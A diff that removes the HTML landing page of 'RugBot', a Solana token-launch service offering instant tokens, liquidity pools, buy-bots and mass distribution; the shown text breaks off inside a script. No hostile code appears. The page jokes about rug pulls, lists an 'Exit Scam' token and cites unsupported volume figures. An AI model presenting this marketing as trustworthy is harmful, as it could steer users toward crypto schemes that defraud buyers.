@@ -1,379 +1,673 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-	<base href="https://rugbot.io/" /><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
-	<link as="font" crossorigin="" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" rel="preload" type="font/woff2" />
-	<link as="image" href="/images/rugbot-logo.png" rel="preload" />
-	<link data-precedence="next" href="/_next/static/css/77ba9dd39a15a08e.css" rel="stylesheet" />
-	<link as="script" fetchpriority="low" href="/_next/static/chunks/webpack-5d5e83a170894e4c.js" rel="preload" /><script src="/_next/static/chunks/fd9d1056-25a48de3dc810523.js" async=""></script><script src="/_next/static/chunks/117-a64f3241d6d232d7.js" async=""></script><script src="/_next/static/chunks/main-app-45d60721d3036a5e.js" async=""></script><script src="/_next/static/chunks/688-4094be91cc7d0e10.js" async=""></script><script src="/_next/static/chunks/893-4a672a349e687ff0.js" async=""></script><script src="/_next/static/chunks/app/page-5c954d9560fb5c2a.js" async=""></script><script src="/_next/static/chunks/560-79dde13b30f095f3.js" async=""></script><script src="/_next/static/chunks/989-5a53e9d6903bd577.js" async=""></script><script src="/_next/static/chunks/588-35a95cf0df88169f.js" async=""></script><script src="/_next/static/chunks/app/layout-2d26a60f999811df.js" async=""></script>
-	<title>RugBot - Create SPL Tokens on Solana Instantly</title>
-	<meta name="description" content="Deploy Solana SPL tokens instantly with RugBot. No coding required, just point, click, and launch your crypto project with ease. Add liquidity, manage your portfolio, and track market performance."/><meta name="keywords" content="Solana,SPL Token,Create Token,Crypto Launchpad,DEX Liquidity,Token Creator,Blockchain Tools,Raydium,Jupiter"/><meta property="og:title" content="RugBot - Create SPL Tokens on Solana Instantly"/><meta property="og:description" content="Deploy Solana SPL tokens instantly with RugBot. No coding required, just point, click, and launch your crypto project with ease. Add liquidity, manage your portfolio, and track market performance."/><meta property="og:url" content="https://rugbot.io"/><meta property="og:site_name" content="RugBot"/><meta property="og:locale" content="en_US"/><meta property="og:image" content="https://rugbot.io/images/android-chrome-512x512.png"/><meta property="og:image:width" content="512"/><meta property="og:image:height" content="512"/><meta property="og:image:alt" content="RugBot Logo"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="RugBot - Create SPL Tokens on Solana Instantly"/><meta name="twitter:description" content="Deploy Solana SPL tokens instantly with RugBot. No coding required, just point, click, and launch your crypto project with ease. Add liquidity, manage your portfolio, and track market performance."/><meta name="twitter:image" content="https://rugbot.io/images/android-chrome-512x512.png"/>
-	<link href="/images/favicon.ico" rel="shortcut icon" />
-	<link href="/images/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png" />
-	<link href="/images/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png" />
-	<link href="/images/apple-touch-icon.png" rel="apple-touch-icon" /><meta name="next-size-adjust"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" nomodule=""></script>
-</head>
-<body class="__className_e8ce0c bg-surface-main text-text-primary"><script>((e,t,r,n,o,i,a,s)=>{let l=document.documentElement,u=["light","dark"];function c(t){(Array.isArray(e)?e:[e]).forEach(e=>{let r="class"===e,n=r&&i?o.map(e=>i[e]||e):o;r?(l.classList.remove(...n),l.classList.add(i&&i[t]?i[t]:t)):l.setAttribute(e,t)}),s&&u.includes(t)&&(l.style.colorScheme=t)}if(n)c(n);else try{let e=localStorage.getItem(t)||r,n=a&&"system"===e?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":e;c(n)}catch(e){}})("class","theme","dark",null,["light","dark"],null,true,true)</script>
-<div class="flex flex-col min-h-screen">
-<div class="relative bg-gradient-to-r from-purple-600 to-blue-600 text-white z-50">
-<div class="container mx-auto px-4 sm:px-6 lg:px-8 py-2 text-center text-sm font-medium">
-<div class="flex items-center justify-center gap-2"><svg class="lucide lucide-megaphone w-4 h-4 flex-shrink-0" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m3 11 18-5v12L3 14v-3z"></path><path d="M11.6 16.8a3 3 0 1 1-5.8-1.6"></path></svg>
-<p><span class="font-semibold">Limited Time Offer:</span> Token creation is now FREE! Don&#39;t miss out on launching your project.</p>
-</div>
-<button aria-label="Dismiss promotional banner" class="absolute top-1/2 right-4 -translate-y-1/2 p-1 rounded-full hover:bg-white/20 transition-colors"><svg class="lucide lucide-x w-4 h-4" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button></div>
-</div>
-
-<header class="sticky top-0 z-50 w-full border-b border-border-primary bg-surface-main/80 backdrop-blur-sm">
-<div class="container mx-auto px-4 sm:px-6 lg:px-8">
-<div class="flex h-16 items-center justify-between">
-<div class="flex items-center justify-start md:w-40"><a class="flex items-center gap-2 flex-shrink-0" href="/"><img alt="RugBot Logo" class="w-8 h-8" src="/images/rugbot-logo.png" /><span class="font-bold text-lg">RugBot</span></a></div>
-
-<nav class="hidden md:flex items-center justify-center gap-6"><a class="text-sm font-medium transition-colors hover:text-text-primary text-text-primary" href="/">Home</a><a class="text-sm font-medium text-text-secondary transition-colors hover:text-text-primary" href="/create">Create Token</a><a class="text-sm font-medium text-text-secondary transition-colors hover:text-text-primary" href="/liquidity">Add Liquidity</a><a class="text-sm font-medium text-text-secondary transition-colors hover:text-text-primary" href="/portfolio">Portfolio</a></nav>
-
-<div class="flex items-center justify-end md:w-40">
-<div class="md:hidden"><button aria-controls="mobile-menu" aria-expanded="false" aria-label="Toggle navigation menu" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover:bg-accent hover:text-accent-foreground h-10 w-10"><svg class="lucide lucide-menu h-6 w-6" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button></div>
-</div>
-</div>
-</div>
-</header>
-
-<main class="flex-1 flex flex-col">
-<div class="container mx-auto px-4 sm:px-6 lg:px-8 py-16 md:py-24">
-<section class="grid md:grid-cols-2 gap-12 items-center">
-<div class="space-y-6">
-<h1 class="text-4xl md:text-5xl lg:text-6xl font-bold tracking-tighter">Create SPL Tokens<br />
-<span class="text-transparent bg-clip-text bg-gradient-to-r from-brand-secondary to-brand-primary">In Seconds</span></h1>
-
-<p class="max-w-md text-text-secondary">Deploy Solana tokens instantly with our advanced token creator. No coding required, just point, click, and launch.</p>
-
-<div><button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 bg-brand-primary hover:bg-brand-primary-hover text-text-primary">Create Token Now <svg class="lucide lucide-arrow-right w-4 h-4 ml-2" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><a href="/create"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></a></svg></button></div>
-
-<div class="grid grid-cols-3 gap-4 pt-4">
-<div class="bg-surface rounded-lg p-4 text-center">
-<p class="text-xl sm:text-2xl md:text-2xl lg:text-3xl font-bold">1,252+</p>
-
-<p class="text-sm text-text-secondary">Tokens Created</p>
-</div>
-
-<div class="bg-surface rounded-lg p-4 text-center">
-<p class="text-xl sm:text-2xl md:text-2xl lg:text-3xl font-bold">$2.1M</p>
-
-<p class="text-sm text-text-secondary">Total Liquidity</p>
-</div>
-
-<div class="bg-surface rounded-lg p-4 text-center">
-<p class="text-xl sm:text-2xl md:text-2xl lg:text-3xl font-bold">$847.5K</p>
-
-<p class="text-sm text-text-secondary">24H Volume</p>
-</div>
-</div>
-</div>
-
-<div>
-<div class="rounded-lg border text-card-foreground shadow-sm bg-surface-card border-border-primary w-full max-w-lg mx-auto">
-<div class="p-6">
-<div class="flex items-center gap-2 mb-6">&nbsp;</div>
-
-<div class="h-32">
-<div class="flex justify-between flex-col items-stretch w-auto py-0 h-[95%]" style="opacity:0;transform:translateY(20px)">
-<div class="flex items-center gap-3 mb-6">
-<div class="w-12 h-12 bg-brand-secondary/20 rounded-full flex items-center justify-center"><svg class="lucide lucide-rocket w-6 h-6 text-brand-secondary" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"></path><path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"></path><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"></path><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"></path></svg></div>
-
-<div class="flex-1">
-<p class="font-bold text-lg">MOON ROCKET</p>
-
-<p class="text-sm text-text-secondary">$MOON</p>
-</div>
-
-<div class="text-right">
-<p class="font-mono text-lg">1,000,000,000</p>
-
-<p class="text-xs text-text-secondary">To the moon!</p>
-</div>
-</div>
-<button class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover:bg-primary/90 h-10 px-4 w-full bg-text-disabled text-text-secondary cursor-not-allowed text-base py-3" disabled="disabled">Creating token...</button></div>
-</div>
-</div>
-</div>
-</div>
-</section>
-
-<section class="py-24">
-<div class="text-center max-w-2xl mx-auto">
-<h2 class="text-3xl md:text-4xl font-bold">Why Choose RugBot?</h2>
-
-<p class="mt-4 text-text-secondary">Professional token creation tools with enterprise-grade security and seamless deployment on RugBot.</p>
-</div>
-
-<div class="mt-12 grid md:grid-cols-2 lg:grid-cols-3 gap-8">
-<div class="bg-surface p-6 rounded-lg">
-<div class="flex items-center gap-3 mb-2"><svg class="lucide lucide-bolt text-brand-primary" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><circle cx="12" cy="12" r="4"></circle></svg>
-
-<h3 class="font-semibold">Lightning Fast Deploy</h3>
-</div>
-
-<p class="text-sm text-text-secondary">Create and deploy your SPL token in under 30 seconds. 200x faster for maximum speed.</p>
-</div>
-
-<div class="bg-surface p-6 rounded-lg">
-<div class="flex items-center gap-3 mb-2"><svg class="lucide lucide-waves text-brand-primary" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M2 6c.6.5 1.2 1 2.5 1C7 7 7 5 9.5 5c2.6 0 2.4 2 5 2 2.5 0 2.5-2 5-2 1.3 0 1.9.5 2.5 1"></path><path d="M2 12c.6.5 1.2 1 2.5 1 2.5 0 2.5-2 5-2 2.6 0 2.4 2 5 2 2.5 0 2.5-2 5-2 1.3 0 1.9.5 2.5 1"></path><path d="M2 18c.6.5 1.2 1 2.5 1 2.5 0 2.5-2 5-2 2.6 0 2.4 2 5 2 2.5 0 2.5-2 5-2 1.3 0 1.9.5 2.5 1"></path></svg>
-
-<h3 class="font-semibold">Instant Liquidity</h3>
-</div>
-
-<p class="text-sm text-text-secondary">One-click liquidity pools on Raydium allow your token to start trading immediately after launch.</p>
-</div>
-
-<div class="bg-surface p-6 rounded-lg">
-<div class="flex items-center gap-3 mb-2"><svg class="lucide lucide-chart-no-axes-column-increasing text-brand-primary" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><line x1="12" x2="12" y1="20" y2="10"></line><line x1="18" x2="18" y1="20" y2="4"></line><line x1="6" x2="6" y1="20" y2="16"></line></svg>
-
-<h3 class="font-semibold">Professional Charts</h3>
-</div>
-
-<p class="text-sm text-text-secondary">Automatic integration with DexScreener and Birdeye for Jupiter, so your token appears where it matters.</p>
-</div>
-
-<div class="bg-surface p-6 rounded-lg">
-<div class="flex items-center gap-3 mb-2"><svg class="lucide lucide-rocket text-brand-primary" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"></path><path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"></path><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"></path><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"></path></svg>
-
-<h3 class="font-semibold">Launch Toolkit</h3>
-</div>
-
-<p class="text-sm text-text-secondary">Everything you need for a successful launch: buy-bots, socials, and marketing tools in one place.</p>
-</div>
-
-<div class="bg-surface p-6 rounded-lg">
-<div class="flex items-center gap-3 mb-2"><svg class="lucide lucide-flame text-brand-primary" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
-
-<h3 class="font-semibold">Fire Features</h3>
-</div>
-
-<p class="text-sm text-text-secondary">Burn and freeze functionality, renounce ownership, and more to keep your holders engaged and secure.</p>
-</div>
-
-<div class="bg-surface p-6 rounded-lg">
-<div class="flex items-center gap-3 mb-2"><svg class="lucide lucide-users text-brand-primary" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
-
-<h3 class="font-semibold">Mass Distribution</h3>
-</div>
-
-<p class="text-sm text-text-secondary">Use our token multisender to distribute tokens to thousands of users with a single click.</p>
-</div>
-</div>
-</section>
-
-<section class="bg-surface rounded-lg p-12 text-center">
-<h2 class="text-3xl md:text-4xl font-bold">Ready to Launch Your Token?</h2>
-
-<p class="mt-4 text-text-secondary max-w-xl mx-auto">Join thousands of projects that trust RugBot for their token creation needs.</p>
-
-<div class="mt-8"><button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 bg-brand-primary hover:bg-brand-primary-hover text-text-primary">Get Started Now <svg class="lucide lucide-arrow-right w-4 h-4 ml-2" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><a href="/create"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></a></svg></button></div>
-</section>
-
-<section class="my-0 mb-0 mt-[60px] py-2.5">
-<div class="text-center max-w-2xl mx-auto">
-<h2 class="text-3xl md:text-4xl font-bold">Tokens Made by Our Customers</h2>
-
-<p class="mt-4 text-text-secondary">Real tokens created with RugBot. From moon shots to rug pulls, we&#39;ve seen it all.</p>
-</div>
-
-<div class="mt-12 grid sm:grid-cols-2 lg:grid-cols-3 gap-6">
-<div class="bg-surface-card border border-border-primary rounded-lg p-4 flex flex-col gap-4">
-<div class="flex justify-between items-start">
-<div class="flex items-center gap-3">
-<div class="w-10 h-10 rounded-full bg-surface-input flex items-center justify-center font-bold text-sm">HQ</div>
-
-<div>
-<p class="font-bold">Diamond Hands</p>
-
-<p class="text-sm text-text-secondary">$HODL</p>
-</div>
-</div>
-
-<div class="text-right">
-<div class="text-xs px-2 py-1 rounded-md flex items-center gap-1 bg-status-success/10 text-status-success"><svg class="lucide lucide-arrow-up w-3 h-3" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m5 12 7-7 7 7"></path><path d="M12 19V5"></path></svg><span>156.7<!-- -->%</span></div>
-
-<p class="text-sm font-mono mt-1">$<!-- -->0.00018500</p>
-</div>
-</div>
-
-<div class="w-full bg-border-primary rounded-full h-1">
-<div class="h-1 rounded-full bg-status-success" style="width:100%">&nbsp;</div>
-</div>
-
-<div class="flex justify-between items-baseline text-sm text-text-secondary"><span>Vol: <span class="text-text-primary font-mono">$<!-- -->2,350</span></span><span>MCap: <span class="text-text-primary font-mono">$<!-- -->18,500</span></span></div>
-</div>
-
-<div class="bg-surface-card border border-border-primary rounded-lg p-4 flex flex-col gap-4">
-<div class="flex justify-between items-start">
-<div class="flex items-center gap-3">
-<div class="w-10 h-10 rounded-full bg-surface-input flex items-center justify-center font-bold text-sm">RL</div>
-
-<div>
-<p class="font-bold">Rocket Fuel</p>
-
-<p class="text-sm text-text-secondary">$BLAST</p>
-</div>
-</div>
-
-<div class="text-right">
-<div class="text-xs px-2 py-1 rounded-md flex items-center gap-1 bg-status-success/10 text-status-success"><svg class="lucide lucide-arrow-up w-3 h-3" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m5 12 7-7 7 7"></path><path d="M12 19V5"></path></svg><span>89.2<!-- -->%</span></div>
-
-<p class="text-sm font-mono mt-1">$<!-- -->0.00034500</p>
-</div>
-</div>
-
-<div class="w-full bg-border-primary rounded-full h-1">
-<div class="h-1 rounded-full bg-status-success" style="width:100%">&nbsp;</div>
-</div>
-
-<div class="flex justify-between items-baseline text-sm text-text-secondary"><span>Vol: <span class="text-text-primary font-mono">$<!-- -->4,670</span></span><span>MCap: <span class="text-text-primary font-mono">$<!-- -->34,500</span></span></div>
-</div>
-
-<div class="bg-surface-card border border-border-primary rounded-lg p-4 flex flex-col gap-4">
-<div class="flex justify-between items-start">
-<div class="flex items-center gap-3">
-<div class="w-10 h-10 rounded-full bg-surface-input flex items-center justify-center font-bold text-sm">AP</div>
-
-<div>
-<p class="font-bold">Degen Ape</p>
-
-<p class="text-sm text-text-secondary">$APE</p>
-</div>
-</div>
-
-<div class="text-right">
-<div class="text-xs px-2 py-1 rounded-md flex items-center gap-1 bg-status-error/10 text-status-error"><svg class="lucide lucide-arrow-down w-3 h-3" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M12 5v14"></path><path d="m19 12-7 7-7-7"></path></svg><span>12.4<!-- -->%</span></div>
-
-<p class="text-sm font-mono mt-1">$<!-- -->0.00009800</p>
-</div>
-</div>
-
-<div class="w-full bg-border-primary rounded-full h-1">
-<div class="h-1 rounded-full bg-status-error" style="width:40%">&nbsp;</div>
-</div>
-
-<div class="flex justify-between items-baseline text-sm text-text-secondary"><span>Vol: <span class="text-text-primary font-mono">$<!-- -->1,230</span></span><span>MCap: <span class="text-text-primary font-mono">$<!-- -->9,800</span></span></div>
-</div>
-
-<div class="bg-surface-card border border-border-primary rounded-lg p-4 flex flex-col gap-4">
-<div class="flex justify-between items-start">
-<div class="flex items-center gap-3">
-<div class="w-10 h-10 rounded-full bg-surface-input flex items-center justify-center font-bold text-sm">GA</div>
-
-<div>
-<p class="font-bold">Galaxy Token</p>
-
-<p class="text-sm text-text-secondary">$GALAXY</p>
-</div>
-</div>
-
-<div class="text-right">
-<div class="text-xs px-2 py-1 rounded-md flex items-center gap-1 bg-status-success/10 text-status-success"><svg class="lucide lucide-arrow-up w-3 h-3" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m5 12 7-7 7 7"></path><path d="M12 19V5"></path></svg><span>234.8<!-- -->%</span></div>
-
-<p class="text-sm font-mono mt-1">$<!-- -->0.00067800</p>
-</div>
-</div>
-
-<div class="w-full bg-border-primary rounded-full h-1">
-<div class="h-1 rounded-full bg-status-success" style="width:100%">&nbsp;</div>
-</div>
-
-<div class="flex justify-between items-baseline text-sm text-text-secondary"><span>Vol: <span class="text-text-primary font-mono">$<!-- -->8,900</span></span><span>MCap: <span class="text-text-primary font-mono">$<!-- -->67,800</span></span></div>
-</div>
-
-<div class="bg-surface-card border border-border-primary rounded-lg p-4 flex flex-col gap-4">
-<div class="flex justify-between items-start">
-<div class="flex items-center gap-3">
-<div class="w-10 h-10 rounded-full bg-surface-input flex items-center justify-center font-bold text-sm">SH</div>
-
-<div>
-<p class="font-bold">Shiba Sol</p>
-
-<p class="text-sm text-text-secondary">$SHIB</p>
-</div>
-</div>
-
-<div class="text-right">
-<div class="text-xs px-2 py-1 rounded-md flex items-center gap-1 bg-status-error/10 text-status-error"><svg class="lucide lucide-arrow-down w-3 h-3" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M12 5v14"></path><path d="m19 12-7 7-7-7"></path></svg><span>8.6<!-- -->%</span></div>
-
-<p class="text-sm font-mono mt-1">$<!-- -->0.00002300</p>
-</div>
-</div>
-
-<div class="w-full bg-border-primary rounded-full h-1">
-<div class="h-1 rounded-full bg-status-error" style="width:25%">&nbsp;</div>
-</div>
-
-<div class="flex justify-between items-baseline text-sm text-text-secondary"><span>Vol: <span class="text-text-primary font-mono">$<!-- -->890</span></span><span>MCap: <span class="text-text-primary font-mono">$<!-- -->2,300</span></span></div>
-</div>
-
-<div class="bg-surface-card border border-border-primary rounded-lg p-4 flex flex-col gap-4">
-<div class="flex justify-between items-start">
-<div class="flex items-center gap-3">
-<div class="w-10 h-10 rounded-full bg-surface-input flex items-center justify-center font-bold text-sm">RE</div>
-
-<div>
-<p class="font-bold">Exit Scam</p>
-
-<p class="text-sm text-text-secondary">$REKT</p>
-</div>
-</div>
-
-<div class="text-right">
-<div class="text-xs px-2 py-1 rounded-md flex items-center gap-1 bg-status-error/10 text-status-error"><svg class="lucide lucide-arrow-down w-3 h-3" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M12 5v14"></path><path d="m19 12-7 7-7-7"></path></svg><span>98.7<!-- -->%</span></div>
-
-<p class="text-sm font-mono mt-1">$<!-- -->0.00000100</p>
-</div>
-</div>
-
-<div class="w-full bg-border-primary rounded-full h-1">
-<div class="h-1 rounded-full bg-status-error" style="width:10%">&nbsp;</div>
-</div>
-
-<div class="flex justify-between items-baseline text-sm text-text-secondary"><span>Vol: <span class="text-text-primary font-mono">$<!-- -->5</span></span><span>MCap: <span class="text-text-primary font-mono">$<!-- -->50</span></span></div>
-</div>
-</div>
-</section>
-</div>
-</main>
-
-<footer class="bg-surface-card border-t border-border-primary">
-<div class="container mx-auto px-4 sm:px-6 lg:px-8 py-12">
-<div class="grid grid-cols-1 md:grid-cols-4 gap-8">
-<div class="col-span-1 md:col-span-2">
-<div class="flex items-center gap-2 mb-4"><a class="flex items-center gap-2 flex-shrink-0" href="/"><img alt="RugBot Logo" class="w-8 h-8" src="/images/rugbot-logo.png" /><span class="font-bold text-lg">RugBot</span></a></div>
-
-<p class="text-text-secondary max-w-xs">The most trusted platform for creating and managing SPL tokens on Solana with RugBot. Deploy professional-grade tokens in seconds.</p>
-</div>
-
-<div>
-<h3 class="font-semibold mb-4">Resources</h3>
-
-<ul class="space-y-2">
-	<li><a class="text-text-secondary hover:text-text-primary" href="/terms">Terms of Service</a></li>
-	<li><a class="text-text-secondary hover:text-text-primary" href="/privacy">Privacy Policy</a></li>
-	<li><a class="text-text-secondary hover:text-text-primary" href="/security">Security</a></li>
-</ul>
-</div>
-
-<div>
-<h3 class="font-semibold mb-4">Community</h3>
-
-<ul class="space-y-2">
-	<li><a class="text-text-secondary hover:text-text-primary" href="#">Telegram</a></li>
-</ul>
-</div>
-</div>
-
-<div class="mt-8 pt-8 border-t border-border-primary text-center text-text-disabled text-sm">&copy; <!-- -->2025<!-- --> RugBot. All rights reserved.</div>
-</div>
-</footer>
-
-<div aria-label="Notifications (F8)" role="region" style="pointer-events:none" tabindex="-1">
-<ol class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]" tabindex="-1">
-</ol>
-</div>
-</div>
-<script src="/_next/static/chunks/webpack-5d5e83a170894e4c.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/77ba9dd39a15a08e.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"3:I[12846,[],\"\"]\n5:I[19107,[],\"ClientPageRoot\"]\n6:I[20256,[\"688\",\"static/chunks/688-4094be91cc7d0e10.js\",\"893\",\"static/chunks/893-4a672a349e687ff0.js\",\"931\",\"static/chunks/app/page-5c954d9560fb5c2a.js\"],\"default\",1]\n7:I[82798,[\"688\",\"static/chunks/688-4094be91cc7d0e10.js\",\"893\",\"static/chunks/893-4a672a349e687ff0.js\",\"560\",\"static/chunks/560-79dde13b30f095f3.js\",\"989\",\"static/chunks/989-5a53e9d6903bd577.js\",\"588\",\"static/chunks/588-35a95cf0df88169f.js\",\"185\",\"static/chunks/app/layout-2d26a60f999811df.js\"],\"ThemeProvider\"]\n8:I[16234,[\"688\",\"static/chunks/688-4094be91cc7d0e10.js\",\"893\",\"static/chunks/893-4a672a349e687ff0.js\",\"560\",\"static/chunks/560-79dde13b30f095f3.js\",\"989\",\"static/chunks/989-5a53e9d6903bd577.js\",\"588\",\"static/chunks/588-35a95cf0df88169f.js\",\"185\",\"static/chunks/app/layout-2d26a60f999811df.js\"],\"GlobalMarketProvider\"]\n9:I[19586,[\"688\",\"static/chunks/688-4094be91cc7d0e10.js\",\"893\",\"static/chunks/893-4a672a349e687ff0.js\",\"560\",\"static/chunks/560-79dde13b30f095f3.js\",\"989\",\"static/chunks/989-5a53e9d6903bd577.js\",\"588\",\"static/chunks/588-35a95cf0df88169f.js\",\"185\",\"static/chunks/app/layout-2d26a60f999811df.js\"],\"default\"]\na:I[14356,[\"688\",\"static/chunks/688-4094be91cc7d0e10.js\",\"893\",\"static/chunks/893-4a672a349e687ff0.js\",\"560\",\"static/chunks/560-79dde13b30f095f3.js\",\"989\",\"static/chunks/989-5a53e9d6903bd577.js\",\"588\",\"static/chunks/588-35a95cf0df88169f.js\",\"185\",\"static/chunks/app/layout-2d26a60f999811df.js\"],\"default\"]\nb:I[88003,[\"688\",\"static/chunks/688-4094be91cc7d0e10.js\",\"893\",\"static/chunks/893-4a672a349e687ff0.js\",\"560\",\"static/chunks/560-79dde13b30f095f3.js\",\"989\",\"static/chunks/989-5a53e9d6903bd577.js\",\"588\",\"static/chunks/588-35a95cf0df88169f.js\",\"185\",\"static/chunks/app/layout-2d26a60f999811df.js\"],\"\"]\nc:I[4707,[],\"\"]\nd:I[36423,[],\"\"]\ne:I[72972,[\"688\",\"static/chunks/688-4094be91cc7d0e10.js\",\"893\",\"static/chunks/893-4a672a349e687ff0.js\",\"560\",\"static/chunks/560-79dde13b30f095f3.js\",\"989\",\"static/chunks/989-5a53e9d6903bd577.js\",\"588\",\"static/chunks/588-35a95cf0df88169f.js\",\"185\",\"static/ch"])</script><script>self.__next_f.push([1,"unks/app/layout-2d26a60f999811df.js\"],\"\"]\nf:I[59556,[\"